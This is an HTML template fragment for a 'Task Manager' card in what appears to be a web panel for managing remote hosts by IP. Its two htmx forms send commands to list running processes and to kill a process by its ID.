<div class="glass-effect rounded-xl p-6 shadow-lg">
    <div class="flex items-center gap-3 mb-4">
        <div
            class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
        >
            <svg
                class="w-4 h-4 text-gray-300"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
            >
                <path
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width="2"
                    d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"
                ></path>
            </svg>
        </div>
        <h3 class="text-lg font-semibold text-white">Task Manager (TM)</h3>
    </div>
    <div class="space-y-3">
        <form
            hx-post="/api/command/{{ ip }}"
            hx-target="#command-output-{{ ip }}"
        >
            <input type="hidden" name="module" value="TM" />
            <input type="hidden" name="args.action" value="list" />
            <button
                type="submit"
                class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200 flex items-center justify-center gap-2"
            >
                <svg
                    class="w-4 h-4"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                >
                    <path
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M4 6h16M4 10h16M4 14h16M4 18h16"
                    ></path>
                </svg>
                List Processes
            </button>
        </form>
        <form
            hx-post="/api/command/{{ ip }}"
            hx-target="#command-output-{{ ip }}"
            class="flex gap-2"
        >
            <input type="hidden" name="module" value="TM" />
            <input type="hidden" name="args.action" value="kill" />
            <input
                type="number"
                name="args.pid"
                placeholder="Process ID"
                class="flex-grow px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 focus:border-gray-400 transition-all"
            />
            <button
                type="submit"
                class="bg-red-600/80 hover:bg-red-600 text-white px-4 py-2 rounded-lg transition-all duration-200"
            >
                Kill
            </button>
        </form>
    </div>
</div>

<style>
    .glass-effect {
        background: rgba(32, 32, 32, 0.8);
        backdrop-filter: blur(20px);
        border: 1px solid rgba(255, 255, 255, 0.1);
    }
</style>
